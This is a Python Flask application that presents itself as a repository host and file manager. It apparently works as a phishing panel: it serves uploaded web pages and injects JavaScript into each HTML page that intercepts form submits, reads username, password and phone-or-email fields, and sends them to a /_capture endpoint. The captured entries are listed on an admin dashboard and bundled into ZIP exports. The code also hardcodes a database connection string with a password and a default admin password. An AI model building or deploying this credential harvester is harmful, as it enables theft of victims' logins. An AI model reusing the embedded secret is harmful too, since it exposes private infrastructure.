"""
Socialize — repo host + form capture + file manager.
Runs with PostgreSQL (or SQLite fallback if DATABASE_URL is missing).
"""
import os, io, json, zipfile, mimetypes, html as html_mod
from datetime import datetime
from functools import wraps
from flask import (Flask, request, session, redirect, url_for,
                   send_file, jsonify, abort, flash, get_flashed_messages)
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import func, or_

# ---------------- config ----------------
BASE = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "dev-secret-change-me")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "socialize123")
app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024

DATABASE_URL = "postgresql://neondb_owner:npg_V06GRufFMiyB@ep-still-field-b4uk713g-pooler.c-6.us-east-2.aws.neon.tech/neondb?sslmode=require&channel_binding=require"

# Allow overriding via env var (Render dashboard), but default to the Neon URL above
db_url = os.environ.get("DATABASE_URL", DATABASE_URL)
if db_url.startswith("postgres://"):
    db_url = db_url.replace("postgres://", "postgresql://", 1)
app.config["SQLALCHEMY_DATABASE_URI"] = db_url
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
    "pool_pre_ping": True,
    "pool_recycle": 280,
}
db = SQLAlchemy(app)

# ---------------- models ----------------
class Repo(db.Model):
    __tablename__ = "repos"
    id = db.Column(db.Integer, primary_key=True)
    slug = db.Column(db.String(100), unique=True, nullable=False, index=True)
    name = db.Column(db.String(200), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class File(db.Model):
    __tablename__ = "files"
    id = db.Column(db.Integer, primary_key=True)
    repo_id = db.Column(db.Integer, db.ForeignKey("repos.id"), nullable=False, index=True)
    path = db.Column(db.String(500), nullable=False)
    is_dir = db.Column(db.Boolean, default=False, nullable=False)
    content = db.Column(db.Text, default="")
    size = db.Column(db.Integer, default=0)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    __table_args__ = (db.UniqueConstraint("repo_id", "path", name="uq_repo_path"),)

class Submission(db.Model):
    __tablename__ = "submissions"
    id = db.Column(db.Integer, primary_key=True)
    repo_id = db.Column(db.Integer, db.ForeignKey("repos.id"), nullable=False, index=True)
    data = db.Column(db.Text, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

with app.app_context():
    db.create_all()

# ---------------- helpers ----------------
def esc(s): return html_mod.escape(str(s))

def fmt_size(n):
    n = n or 0
    if n < 1024: return f"{n} B"
    if n < 1024*1024: return f"{n/1024:.1f} KB"
    return f"{n/1024/1024:.1f} MB"

def is_admin(): return session.get("admin") is True

def admin_required(f):
    @wraps(f)
    def w(*a, **k):
        if not is_admin():
            return redirect(url_for("login", next=request.path))
        return f(*a, **k)
    return w

def get_repo(slug):
    return Repo.query.filter(func.lower(Repo.slug) == slug.lower()).first()

def phone_download_dir():
    for c in ("/storage/emulated/0/Download", "/sdcard/Download",
              os.path.expanduser("~/Download"), os.path.expanduser("~/Downloads")):
        if os.path.isdir(c) and os.access(c, os.W_OK):
            return c
    return None

def upsert_file(repo_id, path, content="", is_dir=False):
    path = path.strip("/")
    if not path: return
    parts = path.split("/")
    for i in range(1, len(parts)):
        parent = "/".join(parts[:i])
        if not File.query.filter_by(repo_id=repo_id, path=parent).first():
            db.session.add(File(repo_id=repo_id, path=parent, is_dir=True, content="", size=0))
    f = File.query.filter_by(repo_id=repo_id, path=path).first()
    if f:
        f.content = content or ""
        f.size = len(content or "")
        f.is_dir = is_dir
        f.updated_at = datetime.utcnow()
    else:
        db.session.add(File(repo_id=repo_id, path=path, content=content or "",
                            size=len(content or ""), is_dir=is_dir))
    db.session.commit()

_CAPTURE_JS = """
<script>
(function(){
  var ids = ['user-name','password','phone-email'];
  document.querySelectorAll('form').forEach(function(f){
    if(!ids.some(function(id){return f.querySelector('#'+id)})) return;
    f.addEventListener('submit', function(e){
      e.preventDefault();
      var data = {};
      ids.forEach(function(id){
        var el = f.querySelector('#'+id);
        if(el) data[id] = el.value;
      });
      fetch('/_capture/__SLUG__', {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify(data)
      }).then(function(r){
        if(r.ok){ f.reset(); alert('Submitted.'); }
        else alert('Error');
      }).catch(function(){ alert('Error'); });
    });
  });
})();
</script>
"""

def inject_capture(html_text, slug):
    if not html_text: return html_text
    script = _CAPTURE_JS.replace("__SLUG__", slug)
    if "</body>" in html_text:
        return html_text.replace("</body>", script + "</body>", 1)
    return html_text + script

# ---------------- responsive CSS ----------------
CSS = """<style>
:root{
  --bg:#0f172a;--card:#1e293b;--text:#e2e8f0;--accent:#38bdf8;
  --muted:#94a3b8;--danger:#f87171;--border:#334155;
  --pad:24px;--radius:12px;
}
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html{-webkit-text-size-adjust:100%}
body{
  margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
  background:var(--bg);color:var(--text);line-height:1.5;
  padding:env(safe-area-inset-top) env(safe-area-inset-right)
          env(safe-area-inset-bottom) env(safe-area-inset-left);
}
.wrap{max-width:1000px;margin:0 auto;padding:var(--pad)}
header{
  display:flex;justify-content:space-between;align-items:center;
  gap:12px;padding-bottom:16px;border-bottom:1px solid var(--border);
  margin-bottom:24px;flex-wrap:wrap;
}
h1{margin:0;font-size:22px}
h2{font-size:17px;margin:0 0 12px;line-height:1.3}
.brand{color:var(--accent)}
a{color:var(--accent);text-decoration:none}
a:hover{text-decoration:underline}
.card{
  background:var(--card);border-radius:var(--radius);padding:20px;
  margin-bottom:16px;border:1px solid var(--border);
}
input,textarea,select{
  font:inherit;font-size:16px;
  padding:12px 14px;border-radius:8px;border:1px solid #475569;
  background:#0f172a;color:var(--text);width:100%;max-width:100%;
}
textarea{
  font-family:ui-monospace,Menlo,monospace;font-size:13px;
  min-height:320px;resize:vertical;
}
button{
  background:var(--accent);color:#0f172a;font-weight:600;border:none;
  cursor:pointer;width:auto;padding:12px 20px;border-radius:8px;
  font-size:15px;min-height:44px;touch-action:manipulation;
}
button:hover{opacity:.9}
button:active{transform:scale(.98)}
button.danger{background:var(--danger);color:#fff}
.row{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-bottom:12px}
.row input{flex:1;min-width:160px}
.muted{color:var(--muted);font-size:14px}
.table-wrap{width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch;margin-top:8px}
table{width:100%;border-collapse:collapse;min-width:520px}
td,th{
  padding:10px;text-align:left;border-bottom:1px solid var(--border);
  font-size:14px;vertical-align:middle;
}
th{
  color:var(--muted);font-weight:500;font-size:12px;
  text-transform:uppercase;white-space:nowrap;
}
tr:hover td{background:rgba(56,189,248,.05)}
.flash{
  padding:12px;background:#1e3a5f;border-radius:8px;
  margin-bottom:16px;border-left:4px solid var(--accent);
}
pre{
  margin:0;font-size:12px;overflow:auto;max-height:220px;
  background:#0b1220;padding:8px;border-radius:6px;
  white-space:pre-wrap;word-break:break-word;
}
@media (max-width:640px){
  :root{--pad:14px;--radius:10px}
  body{font-size:15px}
  h1{font-size:19px}
  h2{font-size:16px;margin-bottom:10px}
  .card{padding:14px;margin-bottom:12px}
  .row{flex-direction:column;align-items:stretch;gap:8px}
  .row input,.row button,.row select{width:100%;min-width:0}
  header{flex-direction:row;flex-wrap:wrap;gap:8px}
  header h1{font-size:18px;flex:1 1 100%}
  header > div{width:100%;text-align:right;font-size:14px}
  form .row button{width:100%}
  table{min-width:0;font-size:13px}
  td,th{padding:8px 6px}
  th{font-size:11px}
  td form{display:inline}
  td form button{padding:4px 10px;font-size:12px;min-height:32px}
  textarea{min-height:50vh;font-size:14px}
  table input[type=checkbox]{width:20px;height:20px;margin:0;vertical-align:middle}
  pre{font-size:11px;max-height:160px}
  .card[style*="margin:60px"]{margin:24px auto !important}
}
@media (max-width:380px){
  :root{--pad:10px}
  h1{font-size:17px}
  button{padding:10px 14px;font-size:14px}
  .card{padding:12px}
}
</style>"""

def page(title, body):
    signout = '<a href="/logout">Sign out</a>' if is_admin() else ''
    return f"""<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>{esc(title)} · Socialize</title>{CSS}</head><body>
<div class="wrap">
<header><h1><a href="/" style="color:inherit;text-decoration:none"><span class="brand">Socialize</span></a></h1>
<div>{signout}</div></header>
{body}</div></body></html>"""

# ---------------- auth ----------------
@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        if request.form.get("password") == ADMIN_PASSWORD:
            session["admin"] = True
            nxt = request.args.get("next") or "/"
            if not nxt.startswith("/"): nxt = "/"
            return redirect(nxt)
        error = "Incorrect password"
    body = f"""
    <div class="card" style="max-width:400px;margin:60px auto">
      <h2>Admin login</h2>
      {f'<p style="color:var(--danger)">{esc(error)}</p>' if error else ''}
      <form method="post">
        <input type="password" name="password" placeholder="Admin password" required autofocus>
        <div style="height:12px"></div>
        <button type="submit">Sign in</button>
      </form>
    </div>
    """
    return page("Login", body)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

# ---------------- dashboard ----------------
@app.route("/")
@admin_required
def dashboard():
    repos = Repo.query.order_by(Repo.created_at.desc()).all()
    total_subs = Submission.query.count()
    recent = Submission.query.order_by(Submission.created_at.desc()).limit(25).all()

    repo_rows = ""
    if repos:
        for r in repos:
            nf = File.query.filter_by(repo_id=r.id, is_dir=False).count()
            ns = Submission.query.filter_by(repo_id=r.id).count()
            repo_rows += f"""<tr>
              <td><a href="/{esc(r.slug)}" target="_blank"><strong>{esc(r.slug)}</strong></a></td>
              <td>{nf}</td><td>{ns}</td>
              <td>
                <a href="/_manage/{esc(r.slug)}">Manage</a> ·
                <a href="/export/{esc(r.slug)}">Export ZIP</a> ·
                <form method="post" action="/repos/{esc(r.slug)}/delete" style="display:inline"
                      onsubmit="return confirm('Delete repo and all files?')">
                  <button class="danger" style="padding:3px 10px;font-size:12px;min-height:0">Delete</button>
                </form>
              </td></tr>"""
    else:
        repo_rows = '<tr><td colspan="4" class="muted">No repos yet.</td></tr>'

    sub_rows = ""
    if recent:
        for s in recent:
            try:
                d = json.loads(s.data); txt = json.dumps(d, indent=2)
            except Exception:
                txt = s.data
            rr = Repo.query.get(s.repo_id)
            sub_rows += f"""<tr>
              <td class="muted">{s.created_at.strftime('%Y-%m-%d %H:%M')}</td>
              <td>{esc(rr.slug if rr else '?')}</td>
              <td><pre>{esc(txt)}</pre></td>
            </tr>"""
    else:
        sub_rows = '<tr><td colspan="3" class="muted">No submissions yet.</td></tr>'

    body = f"""
    <div class="card">
      <h2>Create repository</h2>
      <form method="post" action="/repos/new" class="row">
        <input name="slug" placeholder="slug (e.g. Example)" required>
        <button type="submit">Create</button>
      </form>
      <p class="muted">Public URL will be <code>/slug</code>. Then upload a ZIP from the manage page.</p>
    </div>
    <div class="card">
      <h2>Repositories ({len(repos)})</h2>
      <div class="table-wrap">
        <table><tr><th>Slug</th><th>Files</th><th>Submissions</th><th>Actions</th></tr>{repo_rows}</table>
      </div>
    </div>
    <div class="card">
      <h2>Recent submissions ({total_subs} total)</h2>
      <div class="table-wrap">
        <table><tr><th>Time</th><th>Repo</th><th>Data</th></tr>{sub_rows}</table>
      </div>
    </div>
    """
    return page("Dashboard", body)

@app.route("/repos/new", methods=["POST"])
@admin_required
def new_repo():
    slug = (request.form.get("slug") or "").strip()
    if not slug or "/" in slug or slug.startswith("_"):
        flash("Invalid slug (no slashes, cannot start with _)")
        return redirect(url_for("dashboard"))
    if get_repo(slug):
        flash("Slug already exists")
        return redirect(url_for("dashboard"))
    db.session.add(Repo(slug=slug, name=slug))
    db.session.commit()
    flash(f"Created repo: {slug}")
    return redirect(url_for("manage_files", slug=slug))

@app.route("/repos/<slug>/delete", methods=["POST"])
@admin_required
def delete_repo(slug):
    r = get_repo(slug)
    if r:
        File.query.filter_by(repo_id=r.id).delete()
        Submission.query.filter_by(repo_id=r.id).delete()
        db.session.delete(r)
        db.session.commit()
        flash(f"Deleted repo: {slug}")
    return redirect(url_for("dashboard"))

# ---------------- public serving ----------------
def _serve_file(f, repo):
    content = f.content or ""
    mime = mimetypes.guess_type(f.path)[0] or "text/plain"
    if f.path.lower().endswith((".html", ".htm")):
        content = inject_capture(content, repo.slug)
        mime = "text/html"
    headers = {"Content-Type": mime + ("; charset=utf-8" if mime.startswith("text") or "html" in mime else "")}
    return content, 200, headers

@app.route("/<slug>")
@app.route("/<slug>/")
def serve_index(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    f = File.query.filter_by(repo_id=repo.id, path="index.html").first()
    if f: return _serve_file(f, repo)
    files = File.query.filter_by(repo_id=repo.id, is_dir=False).order_by(File.path).all()
    listing = "".join(f'<li><a href="/{esc(repo.slug)}/{esc(x.path)}">{esc(x.path)}</a></li>' for x in files)
    body = f"""<div class="card"><h2>{esc(repo.slug)}</h2>
      <p class="muted">No index.html yet.</p>
      {'<ul>'+listing+'</ul>' if listing else ''}</div>"""
    return page(repo.slug, body)

@app.route("/<slug>/<path:filepath>")
def serve_path(slug, filepath):
    repo = get_repo(slug)
    if not repo: abort(404)
    f = File.query.filter_by(repo_id=repo.id, path=filepath).first()
    if not f:
        f = File.query.filter_by(repo_id=repo.id, path=filepath.rstrip("/") + "/index.html").first()
    if not f: abort(404)
    return _serve_file(f, repo)

# ---------------- form capture ----------------
@app.route("/_capture/<slug>", methods=["POST"])
def capture(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    data = request.get_json(silent=True) or request.form.to_dict() or {}
    db.session.add(Submission(repo_id=repo.id, data=json.dumps(data)))
    db.session.commit()
    return jsonify(ok=True)

# ---------------- file manager ----------------
def _flash_html():
    out = ""
    for m in get_flashed_messages():
        out += f'<div class="flash">{esc(m)}</div>'
    return out

@app.route("/_manage/<slug>")
@admin_required
def manage_files(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    files = File.query.filter_by(repo_id=repo.id).order_by(File.path).all()

    rows = ""
    for f in files:
        icon = "📁" if f.is_dir else "📄"
        disp = esc(f.path) + ("/" if f.is_dir else "")
        edit = f'<a href="/_manage/{esc(repo.slug)}/edit?path={esc(f.path)}">Edit</a> · ' if not f.is_dir else ''
        view = f'<a href="/{esc(repo.slug)}/{esc(f.path)}" target="_blank">View</a> · ' if not f.is_dir else ''
        rows += f"""<tr>
          <td><input type="checkbox" name="paths" value="{esc(f.path)}" style="width:auto"></td>
          <td>{icon} {disp}</td>
          <td class="muted">{fmt_size(f.size)}</td>
          <td class="muted">{f.updated_at.strftime('%Y-%m-%d %H:%M') if f.updated_at else ''}</td>
          <td>{edit}{view}<a href="/_manage/{esc(repo.slug)}/delete-one?path={esc(f.path)}"
              onclick="return confirm('Delete {esc(f.path)}?')">Delete</a></td>
        </tr>"""
    if not files:
        rows = '<tr><td colspan="5" class="muted">No files. Upload a ZIP or create one.</td></tr>'

    body = f"""
    {_flash_html()}
    <div class="card">
      <h2>{esc(repo.slug)} · File Manager</h2>
      <p class="muted">Public URL: <a href="/{esc(repo.slug)}" target="_blank">/{esc(repo.slug)}</a></p>
    </div>
    <div class="card">
      <h2>Upload ZIP</h2>
      <form method="post" action="/_manage/{esc(repo.slug)}/upload" enctype="multipart/form-data" class="row">
        <input type="file" name="zip" accept=".zip" required>
        <input name="target" placeholder="target folder (optional)">
        <button type="submit">Upload &amp; Extract</button>
      </form>
    </div>
    <div class="card">
      <h2>Create</h2>
      <form method="post" action="/_manage/{esc(repo.slug)}/new" class="row">
        <input name="path" placeholder="path (e.g. index.html or js/app.js)" required>
        <input type="hidden" name="kind" value="file">
        <button type="submit">New File</button>
      </form>
      <form method="post" action="/_manage/{esc(repo.slug)}/new" class="row">
        <input name="path" placeholder="path (e.g. assets)" required>
        <input type="hidden" name="kind" value="folder">
        <button type="submit">New Folder</button>
      </form>
    </div>
    <div class="card">
      <form method="post" action="/_manage/{esc(repo.slug)}/move">
        <h2>Files ({len(files)})</h2>
        <div class="row">
          <input name="target" placeholder="Move selected to folder (empty = root)" style="flex:1">
          <button type="submit">Move Selected</button>
          <button type="submit" formaction="/_manage/{esc(repo.slug)}/delete"
                  class="danger" onclick="return confirm('Delete selected?')">Delete Selected</button>
        </div>
        <div class="table-wrap">
          <table>
            <tr><th></th><th>Path</th><th>Size</th><th>Updated</th><th>Actions</th></tr>
            {rows}
          </table>
        </div>
      </form>
    </div>
    """
    return page("Manage " + repo.slug, body)

@app.route("/_manage/<slug>/upload", methods=["POST"])
@admin_required
def upload_zip(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    up = request.files.get("zip")
    if not up: abort(400)
    target = (request.form.get("target") or "").strip().strip("/")
    try:
        with zipfile.ZipFile(up.stream) as z:
            for name in z.namelist():
                if name.endswith("/"): continue
                if name.startswith("__MACOSX/") or "/._" in name or name.endswith(".DS_Store"): continue
                raw = z.read(name)
                try: text = raw.decode("utf-8")
                except UnicodeDecodeError: text = raw.decode("latin-1", errors="replace")
                path = f"{target}/{name}" if target else name
                upsert_file(repo.id, path, text, is_dir=False)
        flash(f"Extracted ZIP into {esc(repo.slug)}")
    except Exception as e:
        flash(f"ZIP error: {e}")
    return redirect(url_for("manage_files", slug=repo.slug))

@app.route("/_manage/<slug>/new", methods=["POST"])
@admin_required
def new_item(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    path = (request.form.get("path") or "").strip().strip("/")
    kind = request.form.get("kind", "file")
    if not path:
        flash("Path required"); return redirect(url_for("manage_files", slug=repo.slug))
    if File.query.filter_by(repo_id=repo.id, path=path).first():
        flash(f"Already exists: {path}"); return redirect(url_for("manage_files", slug=repo.slug))
    upsert_file(repo.id, path, "", is_dir=(kind == "folder"))
    flash(f"Created {kind}: {path}")
    if kind == "file":
        return redirect(url_for("edit_file", slug=repo.slug, path=path))
    return redirect(url_for("manage_files", slug=repo.slug))

@app.route("/_manage/<slug>/delete", methods=["POST"])
@admin_required
def delete_selected(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    paths = request.form.getlist("paths")
    for p in paths:
        File.query.filter(File.repo_id == repo.id,
                          or_(File.path == p, File.path.like(p + "/%"))
                          ).delete(synchronize_session=False)
    db.session.commit()
    flash(f"Deleted {len(paths)} item(s)")
    return redirect(url_for("manage_files", slug=repo.slug))

@app.route("/_manage/<slug>/delete-one")
@admin_required
def delete_one(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    p = request.args.get("path")
    if p:
        File.query.filter(File.repo_id == repo.id,
                          or_(File.path == p, File.path.like(p + "/%"))
                          ).delete(synchronize_session=False)
        db.session.commit()
        flash(f"Deleted: {p}")
    return redirect(url_for("manage_files", slug=repo.slug))

@app.route("/_manage/<slug>/move", methods=["POST"])
@admin_required
def move_selected(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    paths = request.form.getlist("paths")
    target = (request.form.get("target") or "").strip().strip("/")
    if not paths:
        flash("No items selected"); return redirect(url_for("manage_files", slug=repo.slug))
    try:
        for p in paths:
            f = File.query.filter_by(repo_id=repo.id, path=p).first()
            if not f: continue
            name = p.split("/")[-1]
            newpath = f"{target}/{name}" if target else name
            if newpath == p: continue
            if f.is_dir:
                desc = File.query.filter(File.repo_id == repo.id,
                                         File.path.like(p + "/%")).all()
                for d in desc:
                    d.path = newpath + d.path[len(p):]
            f.path = newpath
        db.session.commit()
        flash(f"Moved {len(paths)} item(s)")
    except Exception as e:
        db.session.rollback()
        flash(f"Move failed: {e}")
    return redirect(url_for("manage_files", slug=repo.slug))

@app.route("/_manage/<slug>/edit", methods=["GET", "POST"])
@admin_required
def edit_file(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    path = request.args.get("path") or request.form.get("path")
    if not path: abort(400)
    f = File.query.filter_by(repo_id=repo.id, path=path).first()
    if not f or f.is_dir: abort(404)
    if request.method == "POST":
        f.content = request.form.get("content", "")
        f.size = len(f.content)
        f.updated_at = datetime.utcnow()
        db.session.commit()
        flash(f"Saved: {path}")
        return redirect(url_for("edit_file", slug=repo.slug, path=path))
    body = f"""
    {_flash_html()}
    <div class="card">
      <h2>Edit: {esc(path)}</h2>
      <form method="post" action="/_manage/{esc(repo.slug)}/edit">
        <input type="hidden" name="path" value="{esc(path)}">
        <textarea name="content" spellcheck="false">{esc(f.content)}</textarea>
        <div class="row" style="margin-top:12px">
          <button type="submit">Save</button>
          <a href="/_manage/{esc(repo.slug)}" style="padding:10px 18px">Back</a>
        </div>
      </form>
    </div>
    """
    return page("Edit " + path, body)

# ---------------- export ----------------
@app.route("/export/<slug>")
@admin_required
def export_repo(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for f in File.query.filter_by(repo_id=repo.id, is_dir=False).all():
            z.writestr(f.path, f.content or "")
        subs = Submission.query.filter_by(repo_id=repo.id).all()
        subs_data = [{"time": s.created_at.isoformat(), "data": json.loads(s.data)}
                     for s in subs]
        z.writestr("_submissions.json", json.dumps(subs_data, indent=2))
    buf.seek(0)

    dl = phone_download_dir()
    if dl:
        try:
            with open(os.path.join(dl, f"{repo.slug}.zip"), "wb") as fh:
                fh.write(buf.getvalue())
            buf.seek(0)
        except Exception:
            pass

    return send_file(buf, mimetype="application/zip",
                     as_attachment=True, download_name=f"{repo.slug}.zip")

@app.errorhandler(404)
def nf(e): return page("Not found", '<div class="card"><h2>404 — Not found</h2></div>'), 404

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=True)
